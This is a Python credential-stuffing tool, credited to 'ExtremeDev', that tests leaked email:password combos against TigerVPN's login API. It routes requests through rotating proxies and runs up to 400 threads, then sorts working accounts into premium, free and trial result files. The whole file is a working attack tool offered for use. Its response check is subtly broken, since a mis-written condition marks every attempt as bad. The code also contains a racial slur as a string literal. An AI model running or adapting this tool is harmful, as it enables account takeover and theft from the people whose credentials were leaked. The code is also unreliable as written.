import requests
import random
import threading
import os
import time
import sys
import json
from re import search
from time import gmtime, strftime
time1 = strftime("%Y-%m-%d-%H-%M-%S", gmtime())



global emails
global passwords
emails = []
passwords = []
combolist = []
proxylist=[]
error=0
bad=0
good=0
cpm=0
cpm1=0
checked=0
banned=0
premium=0
free=0
num=0
trial=0
clear = lambda: os.system('cls')
os.system("title TigerVPN by ExtremeDev")
open("proxies.txt", "a")
open("combos.txt", "a")

if not os.path.exists(f"results/tiger/{time1}/"):
    os.makedirs(f"results/tiger/{time1}/")
mesaje = ["yeah nobody else does it better", "i had to type it: IM SHY", "tedo da pedo", "Wrixty the 60", "legend was here", "0x72 gonna crack this tool"]
logo = """
████████╗██╗ ██████╗ ███████╗██████╗ ██╗   ██╗██████╗ ███╗   ██╗
╚══██╔══╝██║██╔════╝ ██╔════╝██╔══██╗██║   ██║██╔══██╗████╗  ██║
   ██║   ██║██║  ███╗█████╗  ██████╔╝██║   ██║██████╔╝██╔██╗ ██║
   ██║   ██║██║   ██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║
   ██║   ██║╚██████╔╝███████╗██║  ██║ ╚████╔╝ ██║     ██║ ╚████║
   ╚═╝   ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚═╝     ╚═╝  ╚═══╝
                                                                """


def load_accounts():
    with open('combos.txt','r', encoding='utf8') as f:
        for x in f.readlines():
            emails.append(x.split(":")[0].replace('\n',''))
            passwords.append(x.split(":")[1].replace("\n",''))

with open("proxies.txt", 'r', encoding="utf-8", errors='ignore') as n:
    proxypath = n.readlines()
    for linie_proxy in proxypath:
        linie_prox = linie_proxy.split()[0]
        proxylist.append(linie_prox)
    
def ecran():
    global cpm,cpm1,error,good,bad,checked,premium,free,trial
    cpm1=cpm
    cpm=0
    clear()
    print()
    print(logo)
    print()
    print("Coded by ExtremeDev - " + random.choice(mesaje))
    print()
    print(f"Checked: {checked}/{len(emails)}")
    print(f"Good: {good}")
    print(f"Bad: {bad}")
    print(f"Banned: {banned}")
    print(f"Errors: {error}")
    print(f"CPM: {cpm1*60}")
    print()
    print(f"Premium: {premium}")
    print(f"Free: {free}")
    print(f"Trial: {trial}")

    time.sleep(1)
    threading.Thread(target=ecran, args=(),).start()


def menu():
    clear()
    print()
    print(logo)
    print()
    print("Coded by ExtremeDev - " + random.choice(mesaje))
    print()
    print("Hello, welcome to TigerVPN..")
    print("Where do you want to go?")
    print()
    print("[1] TigerVPN checker")
    print("[2] Credits")
    print("[3] Quit")
    alegere_menu = input("->")
    if alegere_menu == "1":
        print()
    elif alegere_menu == "2":
        clear()
        print()
        print(logo)
        print()        
        print("Owner: ExtremeDev#6969")
        print()
        print("Author: ExtremeDev#6969")
        print()
        input("Press ENTER to go on menu")
        menu()
    elif alegere_menu == "3":
        print("We are closing..")
        time.sleep(3)
        sys.exit()
    else:
        print("Invalid input..")
        time.sleep(2)
        menu()
def checker(email, password, proxylist):
    global error, good, bad, cpm, checked, banned, premium, free, trial
    try:
        with requests.Session() as sess:
            proxyz = random.choice(proxylist)
            proxies = {'https': f'https://{proxyz}', 'http': f'http://{proxyz}'}
            sess.proxies= proxies
            url = "https://www.tigervpn.com/api/v3/auth/login.json" 
            content = {
                "email": email,
                "password": password
            }
            headers = {
                "content-type": "application/json; charset=utf-8",
                "User-Agent": "okhttp/3.10.0" 
            }

            r = sess.post(url, data=content, headers=headers)
            if "Username or password incorrect" or "field is required" in r.text:
                bad+=1
                checked+=1
                cpm+=1
                open(f"results/tiger/{time1}/bad.txt", "a").write(f"{email}:{password}\n")
            elif "429 Too Many Requests" or "Too many requests" in r.text:
                banned+=1
                checked+=1
                cpm+=1
                open(f"results/tiger/{time1}/banned.txt", "a").write(f"{email}:{password}\n")
            elif "status\":\"success" in r.text:
                premium+=1
                good+=1
                checked+=1
                cpm+=1
                open(f"results/tiger/{time1}/premium.txt", "a").write(f"{email}:{password}\n")
            elif "vpn_enabled\":false" in r.text:
                trial+=1
                good+=1
                checked+=1
                cpm+=1
                open(f"results/tiger/{time1}/free.txt", "a").write(f"{email}:{password}\n")
            elif "is_trial\":true"  in r.text:
                trial+=1
                good+=1
                checked+=1
                cpm+=1
                open(f"results/tiger/{time1}/free.txt", "a").write(f"{email}:{password}\n")
    except Exception:
        error+=1
        pass

load_accounts()
menu()

if "nibba" == "nibba":
    ecran()
    num = 0
    while 1:
        if threading.active_count() < 400:
            if len(emails) > num:
                threading.Thread(target=checker, args=(emails[num],passwords[num], proxylist,)).start()
                num += 1
